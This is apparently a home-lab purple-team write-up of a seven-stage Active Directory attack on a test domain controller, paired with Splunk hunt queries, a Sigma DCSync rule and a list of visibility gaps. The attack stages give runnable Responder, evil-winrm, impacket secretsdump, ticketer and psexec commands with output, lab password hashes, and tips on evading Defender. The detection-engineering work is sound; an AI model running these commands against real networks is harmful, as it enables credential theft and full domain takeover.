Sprint 1 — Attack 1: Full AD Kill Chain
LLMNR Poisoning → Hash Crack → WinRM → Pass-the-Hash → DCSync → Golden Ticket → psexec
> **Status:** ✅ COMPLETE
> **Date:** 2026-04-20 / 2026-04-21
> **Attacker:** Kali — 10.10.10.99
> **Target:** DC01.corp.local — 10.10.10.40
> **Outcome:** Full domain compromise. All hashes exfiltrated. Golden Ticket forged.
> **Incident ID:** ATK-001
---
Table of Contents
Overview
Stage 1 — LLMNR Poisoning
Stage 2 — Hash Cracking
Stage 3 — WinRM Initial Access
Stage 4 — Pass-the-Hash
Stage 5 — DCSync
Stage 6 — Golden Ticket
Stage 7 — psexec Attempt
SOC Hunt — Blue Team
Detections Built
Visibility Gaps
Sigma Rule
MITRE ATT&CK Map
Lessons Learned
---
Overview
This attack demonstrates a complete Active Directory kill chain starting from zero — just having network access on the same subnet as the target. No credentials. No prior access. Seven stages from initial broadcast poisoning to forged Kerberos tickets granting persistent domain-level access.
Kill Chain Summary
```
LLMNR Poison → Capture NTLMv2 hash
     ↓
Offline crack → Plaintext password
     ↓
evil-winrm → Interactive shell on DC01
     ↓
Pass-the-Hash → Shell without plaintext
     ↓
DCSync → ALL domain hashes dumped
     ↓
Golden Ticket → Forged TGT using krbtgt hash
     ↓
psexec → Lateral movement attempt (blocked by Defender)
```
Why This Attack Chain Matters
LLMNR poisoning is one of the most common attack entry points in real enterprise environments because LLMNR is enabled by default on all Windows machines and most organizations never disable it. Once an attacker captures a single hash from a privileged account, the path to full domain compromise is straightforward and well-documented.
---
Stage 1 — LLMNR Poisoning
What Is LLMNR?
Link-Local Multicast Name Resolution is a Windows protocol that acts as a fallback when DNS fails. When a Windows machine tries to reach a hostname that DNS can't resolve (like `\\FAKESHARE`), it broadcasts an LLMNR query to the entire local subnet asking "does anyone know this host?" An attacker on the same subnet can respond "yes, that's me" and Windows will attempt to authenticate — sending an NTLMv2 hash.
MITRE Technique
`T1557.001 — Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay`
What We Did
On dc-vm (victim): Browsed to `\\FAKESHARE` in Windows File Explorer — this triggers an LLMNR broadcast because `FAKESHARE` doesn't exist in DNS.
On Kali (attacker):
```bash
sudo responder -I eth0 -dwv
```
Flag explanation:
`-I eth0` — listen on the eth0 interface
`-d` — enable DHCP poisoning
`-w` — enable WPAD proxy server
`-v` — verbose output
Note: `-r` flag removed — newer versions of Responder dropped it
Result
```
[SMB] NTLMv2-SSP Client   : 10.10.10.40
[SMB] NTLMv2-SSP Username : CORP\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::CORP:...
```
Hash saved to:
```
/usr/share/responder/logs/SMB-NTLMv2-SSP-fe80::c1b1:46ee:a893:40ea.txt
```
Note: Hash was captured on the IPv6 address, not IPv4 — Responder listens on both.
Detection Status
❌ Not detected — VIS-001 (intra-LAN, traffic does not route through OPNsense/Suricata)
---
Stage 2 — Hash Cracking
What Is NTLMv2?
The captured hash is not the actual password — it's a challenge-response authentication exchange. It cannot be used directly for Pass-the-Hash (that requires the NT hash). It must be cracked offline to recover the plaintext password.
MITRE Technique
`T1110.002 — Brute Force: Password Cracking`
What We Did
Built OSINT-informed wordlist simulating real attacker recon:
```bash
cat > /tmp/corp_wordlist.txt << EOF
CorpWin2025
CorpWin2025!
Corp2025
Corp2025!
Winter2025
Winter2025!
Password123!
Welcome1
Welcome2025
EOF
```
Wordlist logic: Company name (Corp) + OS hint (Win) + year (2025) — this is how real attackers build targeted wordlists from LinkedIn, job postings, and company websites.
Saved hash to file:
```bash
cp "/usr/share/responder/logs/SMB-NTLMv2-SSP-fe80::c1b1:46ee:a893:40ea.txt" /tmp/admin.hash
```
Attempted hashcat (failed — VM OpenCL limitation):
```bash
hashcat -m 5600 /tmp/admin.hash /tmp/corp_wordlist.txt
# Error: no OpenCL devices found — VM GPU limitation
```
Used John instead:
```bash
john --format=netntlmv2 --wordlist=/tmp/corp_wordlist.txt /tmp/admin.hash
```
Result
```
CorpWin2025      (Administrator)
```
Key lesson: `CorpWin2025!` ≠ `CorpWin2025` — passwords are case and character sensitive. The wordlist must include exact variants.
Detection Status
❌ Not detected — offline operation. No logging system can see this.
---
Stage 3 — WinRM Initial Access
What Is WinRM?
Windows Remote Management — Microsoft's implementation of the WS-Management protocol. Allows remote PowerShell sessions on port 5985 (HTTP) or 5986 (HTTPS). Enabled by default on Windows Servers.
MITRE Technique
`T1021.006 — Remote Services: Windows Remote Management`
What We Did
```bash
evil-winrm -i 10.10.10.40 -u Administrator -p 'CorpWin2025'
```
Result
```
Evil-WinRM shell v3.7
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```
Verified access:
```powershell
whoami          # corp\administrator
hostname        # DC01
net user /domain  # showed all domain users
```
Detection Status
✅ Detected — EventCode 4624, NTLM, Logon_Type=3, src_ip=10.10.10.99
---
Stage 4 — Pass-the-Hash
What Is Pass-the-Hash?
Instead of using the plaintext password, an attacker uses the NT hash directly to authenticate. NTLM authentication protocol accepts the hash itself as proof of identity — the hash IS the credential. Doesn't require cracking.
MITRE Technique
`T1550.002 — Use Alternate Authentication Material: Pass the Hash`
What We Did
```bash
evil-winrm -i 10.10.10.40 -u Administrator -H 423fe085824dc357762259ddbb2631d2
```
Result
```
Evil-WinRM shell v3.7
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```
Same shell as Stage 3 — but no password needed. Just the hash.
Detection Status
✅ Detected — EventCode 4624, NTLM, src_ip=10.10.10.99. Indistinguishable from Stage 3 in logs — same event pattern.
---
Stage 5 — DCSync
What Is DCSync?
DCSync abuses the Active Directory replication protocol. An attacker with replication rights (DS-Replication-Get-Changes-All) tells the Domain Controller "I'm another DC, please sync your password database to me." The DC complies and sends all password hashes. Impacket implements this via the DRSUAPI interface.
MITRE Technique
`T1003.006 — OS Credential Dumping: DCSync`
What We Did
```bash
impacket-secretsdump CORP/Administrator:'CorpWin2025'@10.10.10.40
```
Result
```
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:423fe085824dc357762259ddbb2631d2:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:94645007672cec1a5ac3a6ac6c08184e:::
corp.local\jsmith:1103::2b576acbe6bcfda7294d6bd18041b8fe:::
corp.local\jdoe:1104::2b576acbe6bcfda7294d6bd18041b8fe:::
corp.local\svc-jenkins:1105::15a8eccc12c937774986f16cdef99758:::
```
All domain hashes exfiltrated. Full domain compromise achieved.
Account	NTLM Hash
Administrator	423fe085824dc357762259ddbb2631d2
krbtgt	94645007672cec1a5ac3a6ac6c08184e
jsmith	2b576acbe6bcfda7294d6bd18041b8fe
jdoe	2b576acbe6bcfda7294d6bd18041b8fe
svc-jenkins	15a8eccc12c937774986f16cdef99758
Detection Status
✅ Detected — EventCode 4662 with GUIDs 1131f6aa + 1131f6ad in `_raw`
---
Stage 6 — Golden Ticket
What Is a Golden Ticket?
A Golden Ticket is a forged Kerberos TGT (Ticket Granting Ticket) created using the krbtgt account's NT hash and the domain SID. Because the krbtgt hash is the signing key for all Kerberos tickets in the domain, a forged ticket is indistinguishable from a legitimate one. Valid until the krbtgt password is reset — twice.
MITRE Technique
`T1558.001 — Steal or Forge Kerberos Tickets: Golden Ticket`
What We Did
Add DC to hosts file:
```bash
echo "10.10.10.40 DC01.corp.local" >> /etc/hosts
```
Forge the ticket:
```bash
impacket-ticketer \
  -nthash 94645007672cec1a5ac3a6ac6c08184e \
  -domain-sid S-1-5-21-1380357316-3734788512-141239861 \
  -domain corp.local \
  Administrator
```
Result:
```
[*] Creating basic skeleton ticket and PAC Infos
[*] Saving ticket in Administrator.ccache
```
Use the ticket:
```bash
export KRB5CCNAME=Administrator.ccache
```
Notes
Ticket saved as `Administrator.ccache` on Kali
Newer impacket defaults to AES256 (0x12) not RC4 (0x17) — the old "RC4 = Golden Ticket" detection rule is becoming unreliable
Ticket is valid until krbtgt password is reset twice with 10-hour gap
Detection Status
✅ Detected — EventCode 4769 for Administrator with zero preceding EventCode 4768. Service tickets requested with no TGT request = forged ticket.
---
Stage 7 — psexec Attempt
What Is psexec?
Impacket's psexec uploads a randomly named service binary to the ADMIN$ share (C:\Windows), registers it as a Windows service, starts it to get a SYSTEM shell, then removes it. Classic lateral movement technique.
MITRE Technique
`T1569.002 — System Services: Service Execution`
What We Did
```bash
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass corp.local/Administrator@DC01.corp.local
```
Three attempts — all blocked by Windows Defender:
```
[*] Uploading file rGXtHpUc.exe       ← random name each attempt
[*] Creating service QYag
[*] Starting service QYag
[-] SCMR SessionError: code: 0x41d    ← Defender killed binary
```
Result
Shell did not pop. Defender caught the binary signatures. However — the service registration was logged before Defender killed the binary, giving us EventCode 7045.
Timestamp	Service Name	Binary
22:39:23	OOwN	%systemroot%\AdCbLUJI.exe
22:41:19	rnDL	%systemroot%\ogiEnCZd.exe
22:41:51	QYag	%systemroot%\rGXtHpUc.exe
Impacket psexec signature: 4-character random service name + 8-character random exe dropped to `%systemroot%` (C:\Windows) running as LocalSystem.
Detection Status
✅ Detected — EventCode 7045, random 4-char service names, binary in %systemroot%
---
SOC Hunt — Blue Team
Prerequisites Fixed During This Hunt
Before detections worked, two infrastructure problems had to be solved:
Problem 1 — src_ip not parsing from Windows Security events
The attacker IP was buried in free text inside the event message. Splunk couldn't extract it automatically.
Fix — added to `/opt/splunk/etc/system/local/props.conf` on blue-vm:
```ini
[WinEventLog:Security]
EXTRACT-src_ip = Source Network Address:\s+(?<src_ip>[^\s]+)
EXTRACT-src_port = Source Port:\s+(?<src_port>[^\s]+)
EXTRACT-workstation = Workstation Name:\s+(?<src_workstation>[^\s]+)
```
Then: `sudo /opt/splunk/bin/splunk restart`
Problem 2 — EventCode 4662 DCSync GUIDs not in parsed Properties field
Splunk was truncating the multi-line Properties field. The replication GUIDs existed in the raw event but not in the extracted field.
Fix — search `_raw` directly instead of the parsed field:
```spl
| search _raw="*1131f6aa*" OR _raw="*1131f6ad*"
```
Problem 3 — DS Access auditing not enabled on DC01
Without this, Windows never generated 4662 events at all.
Fix — on dc-vm PowerShell as Administrator:
```powershell
auditpol /set /subcategory:"Directory Service Access" /success:enable /failure:enable
auditpol /get /subcategory:"Directory Service Access"
# Should show: Success and Failure
```
---
Hunt Queries — Run in Order
Step 1 — Confirm attacker IP is visible
```spl
index=windows EventCode=4624 Account_Name=Administrator Authentication_Package=NTLM
| table _time, Account_Name, Authentication_Package, Logon_Type, src_ip
| sort -_time
```
Expected: 12 events from 10.10.10.99
Step 2 — Hunt DCSync
```spl
index=windows EventCode=4662
| search _raw="*1131f6aa*" OR _raw="*1131f6ad*"
| where NOT match(Account_Name, "\$$")
| eval dcsync_guid=case(
    match(_raw,"1131f6aa"), "DS-Replication-Get-Changes",
    match(_raw,"1131f6ad"), "DS-Replication-Get-Changes-All",
    true(), "Unknown"
  )
| eval mitre_technique="T1003.006 - DCSync"
| table _time, Account_Name, dcsync_guid, mitre_technique
| sort -_time
```
Expected: 76 events — Administrator triggering both replication GUIDs at ~00:42:54
Step 3 — Hunt Golden Ticket (confirm no prior 4768)
```spl
index=windows (EventCode=4768 OR EventCode=4769)
Account_Name="Administrator@CORP.LOCAL"
| table _time, EventCode, Account_Name, Service_Name, Ticket_Encryption_Type
| sort _time
```
Expected: 8 x EventCode 4769 — zero 4768 for Administrator
Step 4 — Golden Ticket full detection
```spl
index=windows EventCode=4769
| where Service_Name="krbtgt"
  OR (Account_Name="Administrator@CORP.LOCAL" AND Service_Name="DC01$")
| eval golden_ticket_indicator=case(
    Service_Name="krbtgt", "HIGH - krbtgt service ticket request",
    match(Account_Name,"Administrator") AND Service_Name="DC01$",
    "MEDIUM - Admin Kerberos to DC without prior TGT",
    true(), "UNKNOWN"
  )
| eval mitre_technique="T1558.001 - Golden Ticket"
| table _time, Account_Name, Service_Name, Ticket_Encryption_Type, golden_ticket_indicator, mitre_technique
| sort _time
```
Step 5 — Hunt psexec service installs
```spl
index=windows EventCode=7045
| eval suspicious=case(
    match(Service_File_Name, "%systemroot%\\[A-Za-z]{8}\.exe"), "HIGH - Random binary in systemroot",
    match(Service_Name, "^[A-Za-z]{4}$"), "HIGH - Random 4-char service name",
    true(), "LOW - Review manually"
  )
| eval mitre_technique="T1569.002 - Service Execution"
| table _time, Service_Name, Service_File_Name, Service_Account, suspicious, mitre_technique
| sort -_time
```
Expected: 3 HIGH events — OOwN, rnDL, QYag
Step 6 — Full kill chain timeline
```spl
index=windows
(
  (EventCode=4624 Authentication_Package=NTLM Account_Name=Administrator)
  OR EventCode=4662
  OR (EventCode=4769 Account_Name="Administrator@CORP.LOCAL")
  OR EventCode=7045
)
| eval attack_stage=case(
    EventCode=4624, "Stage 3/4 - WinRM / Pass-the-Hash",
    EventCode=4662, "Stage 5 - DCSync",
    EventCode=4769, "Stage 6 - Golden Ticket",
    EventCode=7045, "Stage 7 - psexec Attempt",
    true(), "Unknown"
  )
| eval mitre=case(
    EventCode=4624, "T1550.002 / T1021.006",
    EventCode=4662, "T1003.006",
    EventCode=4769, "T1558.001",
    EventCode=7045, "T1569.002",
    true(), "Unknown"
  )
| table _time, attack_stage, EventCode, Account_Name, mitre
| sort _time
```
Expected: 209 events spanning all 7 stages
---
Detections Built
#	Detection Name	EventCode	Key Filter	Evidence Found	MITRE
1	NTLM Admin logon from attacker IP	4624	`Authentication_Package=NTLM AND src_ip=10.10.10.99`	12 events	T1550.002 / T1021.006
2	DCSync replication rights abuse	4662	`_raw contains 1131f6aa or 1131f6ad, Account not ending in $`	76 events	T1003.006
3	Golden Ticket — no prior TGT	4769	`Service_Name=krbtgt OR (Admin + DC01$ + no 4768)`	8 events	T1558.001
4	WinRM network connection	Sysmon EC3	`DestinationPort=5985`	GAP — Sysmon not flowing	T1021.006
5	psexec service installation	7045	`Service_Name matches ^[A-Za-z]{4}$`	4 events (3 impacket)	T1569.002
How to Save These as Splunk Alerts
For each detection query:
Run the query in Splunk
Click Save As → Alert
Set schedule: Every 15 minutes, Last 15 minutes
Trigger: Number of results > 0
Action: Add to Triggered Alerts
Alert Title	Severity
ALERT - DCSync Attack Detected (T1003.006)	Critical
ALERT - Golden Ticket Usage (T1558.001)	Critical
ALERT - NTLM Admin Logon from External IP (T1550.002)	High
ALERT - Suspicious Service Installation (T1569.002)	High
---
Visibility Gaps
ID	Gap	Root Cause	Impact	Fix
VIS-001	Suricata blind to all intra-LAN attacks	Kali and DC01 on same L2 — traffic never routes through OPNsense em1	LLMNR, WinRM, PtH, DCSync, Golden Ticket invisible at network layer	vSwitch port mirroring — configure LAN portgroup to SPAN to OPNsense em1
VIS-002	Sysmon EventCode 3 returns 0 in Splunk	Sysmon may not be installed or forwarding correctly from dc-vm	No network connection telemetry from endpoint layer	Verify Sysmon install on dc-vm, check UF inputs.conf
VIS-003	Offline hash cracking undetectable	Offline operation — no logs anywhere	Stage 2 permanently invisible	Accepted — prevent hash theft upstream (disable LLMNR)
Real-World Context — VIS-001
This is not a home lab limitation. Most enterprise environments have the same east-west visibility problem. Perimeter IDS only sees traffic crossing the perimeter. Lateral movement between internal hosts on the same VLAN is invisible. This is why SolarWinds attackers moved undetected for 9 months. The fix is NDR (Network Detection and Response) sensors on every VLAN, or SPAN ports feeding a dedicated sensor.
---
Sigma Rule
File: `sigma_dcsync_T1003.006.yml`
```yaml
title: DCSync Attack - Replication Rights Abuse by Non-Machine Account
id: a9b4c8e2-1f3d-4a5b-8c6e-9d2f0e7a1b3c
status: stable
description: |
    Detects DCSync attacks where a non-machine account requests Active Directory
    replication rights. Impacket secretsdump and Mimikatz dcsync both trigger
    EventCode 4662 with DS-Replication-Get-Changes GUIDs. Legitimate replication
    only occurs between DC machine accounts (ending in $).
references:
    - https://attack.mitre.org/techniques/T1003/006/
author: CorpLab SOC
date: 2026-04-21
tags:
    - attack.credential_access
    - attack.t1003.006
logsource:
    product: windows
    service: security
detection:
    selection:
        EventID: 4662
        Properties|contains:
            - '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2'
            - '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2'
    filter_legitimate:
        SubjectUserName|endswith: '$'
    condition: selection and not filter_legitimate
fields:
    - SubjectUserName
    - SubjectDomainName
    - ObjectType
    - Properties
falsepositives:
    - Legitimate DC-to-DC replication (filtered by machine account check)
    - Azure AD Connect sync accounts (whitelist if present)
    - Third-party AD sync tools running under service accounts
level: high
```
How Sigma Rules Are Used
In your lab: The SPL translation at the bottom is the Splunk query. Paste directly into Splunk.
In real SOCs: Use `sigma-cli` to auto-convert to any SIEM:
```bash
  sigma convert -t splunk sigma_dcsync_T1003.006.yml
  sigma convert -t sentinel sigma_dcsync_T1003.006.yml
  sigma convert -t elasticsearch sigma_dcsync_T1003.006.yml
  ```
Community sharing: Published to GitHub `/detections/credential-access/` folder so other teams can use it.
---
MITRE ATT&CK Map
Stage	Technique ID	Technique Name	Tactic	Tool	Detected
1	T1557.001	LLMNR/NBT-NS Poisoning	Credential Access	Responder	❌ VIS-001
2	T1110.002	Password Cracking	Credential Access	John the Ripper	❌ Offline
3	T1021.006	Remote Services: WinRM	Lateral Movement	evil-winrm	✅ EC 4624
4	T1550.002	Pass the Hash	Defense Evasion	evil-winrm -H	✅ EC 4624
5	T1003.006	DCSync	Credential Access	impacket-secretsdump	✅ EC 4662
6	T1558.001	Golden Ticket	Credential Access	impacket-ticketer	✅ EC 4769
7	T1569.002	Service Execution	Execution	impacket-psexec	✅ EC 7045
Detection rate: 5/7 (71%)
---
Deliverables
File	Description
`ATK-001.json`	Full structured incident report in SOAR-consumable JSON format
`sigma_dcsync_T1003.006.yml`	Sigma detection rule for DCSync — portable to any SIEM
`ATK-001-Incident-Report.docx`	Human-readable incident report with tables and executive summary
---
Lessons Learned
Detection Engineering
Don't trust parsed fields for complex events. Windows 4662 Properties is multi-line. Splunk truncates it. Always verify GUIDs exist in `_raw` before concluding detection is impossible.
Filter machine accounts in DCSync detection. `DC01$` legitimately triggers the same GUIDs. If you don't filter `Account_Name` ending in `$` you'll have constant false positives.
Golden Ticket detection evolved. Modern impacket uses AES256 not RC4. Detection based on RC4 encryption type alone is now unreliable. Better: look for 4769 with no preceding 4768 for the same account.
Audit policy must be configured before attacks. No audit policy = no events = no detection. Enabling DS Access auditing mid-hunt required rerunning the attack.
Infrastructure
Source IP extraction is not automatic. Splunk does not parse `Source Network Address` from Windows Security events by default. Required custom regex in props.conf.
Suricata east-west blind spot is architectural, not a config bug. Don't waste time reconfiguring Suricata when the root cause is that traffic never reaches it. Identify it, document it, accept it or fix the network.
File-based EVE JSON is more reliable than syslog EVE. OPNsense `/var/log/suricata/eve.json` is the authoritative log. The syslog output is a secondary copy that gets mixed with general OPNsense syslog making it hard to parse.
Attack Tradecraft
LLMNR poisoning is trivially easy and extremely effective. One command. One mistake by a user browsing to a nonexistent share. Full hash capture. Disabled by GPO in 30 seconds — yet most organizations never do it.
Responder dropped the `-r` flag. Newer versions don't support it. Remove it or the command fails silently.
Hashcat needs GPU. VMs don't have GPU. Use John for VM-based cracking. Always.
psexec is loud. Three service installs in two minutes is obvious in EventCode 7045. Real attackers use LOLBins (living-off-the-land binaries) or WMI instead to avoid this signature.
Defender catches impacket psexec binaries by signature. The binary is well-known. Real engagements require custom or obfuscated payloads.
---
Next: Attack 2 — SMB Relay
SMB Relay takes LLMNR poisoning one step further. Instead of capturing and cracking the hash, the attacker relays it in real-time to another system to authenticate directly — no cracking needed.
Tool: `ntlmrelayx`
Target: dc-vm
MITRE: `T1557.001`
Prerequisite: SMB signing must be disabled on target (check with `nmap --script smb2-security-mode`)
